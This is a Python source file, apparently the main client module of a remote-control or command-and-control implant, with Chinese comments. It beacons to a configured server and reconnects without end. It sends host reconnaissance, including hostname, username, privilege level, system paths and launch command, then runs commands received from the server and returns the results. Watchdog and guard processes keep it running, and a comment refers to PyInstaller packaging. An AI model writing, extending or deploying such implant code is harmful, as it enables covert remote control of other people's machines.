import os
import platform
import queue
import socket
import sys
import threading
import time
import uuid


from client.config.runtime_config import HTTP_TRANSFER_MODE, PYTHON_EXECUTION_MODE
from client.connection.server_connection import ServerConnection
from client.watchdog.client_guard_manager import ClientGuardManager
from client.watchdog.watchdog_process import run_watchdog_worker_from_argv
from core.utils.client_util import check_privilege, get_system_paths
from core.utils.logger import logger

from client.config.config import (
    CLIENT_BUILD_VERSION,
    RECONNECT_INTERVAL_SECONDS,
    SERVER_ADDR, REMOTE_HTTP_WATCHDOG_ENABLED, LOCAL_WATCHDOG_ENABLED,
)

# 强制导入所有平台模块，让 PyInstaller 检测到

if os.name == 'nt':
    pass


class Client:
    RECONNECT_INTERVAL = RECONNECT_INTERVAL_SECONDS

    def __init__(self, address):
        self.address = address
        self.client_id = str(uuid.uuid4())
        self.server = None

        self._receiver_thread = None
        self._receiver_stop_event = threading.Event()
        self._receiver_error = None
        self._receiver_error_lock = threading.Lock()

        self.guard_manager = ClientGuardManager(
            client_id=self.client_id,
        )

        self._create_connection()
        self.guard_manager.start()

    def _create_connection(self):
        """
        创建一个新的服务端连接对象
        """
        self.server = ServerConnection()
        self.server.client_id = self.client_id
        self.server.guard_manager = self.guard_manager

    def _close_current_connection(self):
        """
        关闭当前连接
        """
        try:
            self.server.close()
        except Exception:
            pass

    def _clear_receiver_error(self):
        with self._receiver_error_lock:
            self._receiver_error = None

    def _set_receiver_error(self, error):
        with self._receiver_error_lock:
            if self._receiver_error is None:
                self._receiver_error = error

    def _pop_receiver_error(self):
        with self._receiver_error_lock:
            error = self._receiver_error
            self._receiver_error = None
            return error

    def _stop_receiver_thread(self):
        """
        停止接收线程
        """
        self._receiver_stop_event.set()

    def _reset_receiver_runtime(self):
        """
        重置接收线程运行态
        """
        self._receiver_stop_event = threading.Event()
        self._clear_receiver_error()
        self._receiver_thread = None

    def _reset_connection(self):
        """
        关闭当前连接并重建连接对象
        """
        self._stop_receiver_thread()
        self._close_current_connection()
        self._handle_connection_lost()
        self._reset_receiver_runtime()
        self._create_connection()

    def _build_client_info(self):
        """
        构造客户端基础信息
        """
        command_manifest = []
        try:
            commands = self.server.command_executor.get_commands()
            if hasattr(commands, 'get_command_manifest_payload'):
                command_manifest = commands.get_command_manifest_payload()
        except Exception:
            command_manifest = []

        executable_path = os.path.realpath(sys.executable)
        script_path = os.path.realpath(''.join(sys.argv))

        try:
            import psutil
            process = psutil.Process()
            username = process.username()
            process_name = process.name()
            uptime = f'{round(time.time() - process.create_time(), 2)}s'
        except:
            username = ""
            process_name = ""
            uptime = ""

        return {
            'id': self.client_id,
            'type': 'info',
            'os_type': platform.system(),
            'os_ver': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': check_privilege(),
            'cwd': os.getcwd(),
            'command_manifest': command_manifest,
            'system_paths': get_system_paths(),
            'python_ver': platform.python_version(),
            'process_id': os.getpid(),
            'launch_command': f'{executable_path} {script_path}',
            'username': username,
            'process_name': process_name,
            'http_transfer_mode': HTTP_TRANSFER_MODE,
            'python_execution_mode': PYTHON_EXECUTION_MODE,
            'remote_watchdog_enabled': REMOTE_HTTP_WATCHDOG_ENABLED,
            'local_watchdog_enabled': LOCAL_WATCHDOG_ENABLED,
            'build_version': CLIENT_BUILD_VERSION,
        }

    def _connect_socket(self):
        """
        建立到底层服务端的连接；失败时持续重试
        """
        logger.info(f'Connecting to {self.address}')

        while not self.server.connect(self.address):
            time.sleep(self.RECONNECT_INTERVAL)
            print('Attempting to reconnect...')
            self._create_connection()

    def _handshake(self):
        """
        连接建立后发送客户端握手信息
        """
        info = self._build_client_info()
        self.server.send(info)
        self.server.mark_connected()
        logger.info('Connected')

    def _receiver_loop(self):
        """
        后台接收线程：
        - 持续 recv 收包
        - 由 ServerConnection 统一决定如何处理消息
        """
        while not self._receiver_stop_event.is_set():
            try:
                self.server.recv_message()
            except socket.error as e:
                if not self._receiver_stop_event.is_set():
                    self._set_receiver_error(e)
                break
            except Exception as e:
                if not self._receiver_stop_event.is_set():
                    self._set_receiver_error(e)
                break

    def _start_receiver_thread(self):
        """
        启动后台接收线程
        """
        self._receiver_stop_event.clear()
        self._clear_receiver_error()

        self._receiver_thread = threading.Thread(
            target=self._receiver_loop,
            name='ClientReceiver',
            daemon=True
        )
        self._receiver_thread.start()

    def connect(self):
        """
        建立连接并完成握手
        """
        self.guard_manager.start()
        self._connect_socket()
        self._handshake()
        self._start_receiver_thread()

    def _recover_from_connection_error(self, error):
        """
        连接异常后的恢复逻辑
        """
        logger.error(error, exc_info=True)
        self._reset_connection()
        self.connect()

    def wait(self):
        while True:
            try:
                receiver_error = self._pop_receiver_error()
                if receiver_error is not None:
                    raise receiver_error

                result = self.server.recv_command(timeout=0.5)
                if result:
                    self.server.send_result(*result)
            except queue.Empty:
                continue
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error as e:
                self._recover_from_connection_error(e)
            except Exception as e:
                self._recover_from_connection_error(e)

    def _handle_connection_lost(self):
        """
        连接断开时的统一清理逻辑：
        - 先标记连接失效
        - 停掉所有后台任务
        - 清掉旧连接运行态
        """
        try:
            self.server.mark_disconnected()
        except Exception:
            pass

        try:
            stopped_jobs = self.server.job_manager.handle_connection_lost()
            if stopped_jobs:
                logger.info(f'Stopped background jobs after connection loss: {stopped_jobs}')
        except Exception as e:
            logger.error(f'Failed to stop background jobs after connection loss: {e}', exc_info=True)

        try:
            self.server.reset_runtime_state()
        except Exception as e:
            logger.error(f'Failed to reset runtime state after connection loss: {e}', exc_info=True)


if __name__ == '__main__':
    if '--watchdog-worker' in sys.argv[1:]:
        run_watchdog_worker_from_argv()
        sys.exit(0)

    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        client.guard_manager.stop()
        sys.exit(0)
    except Exception as e:
        client.guard_manager.stop()
        logger.error(e, exc_info=True)
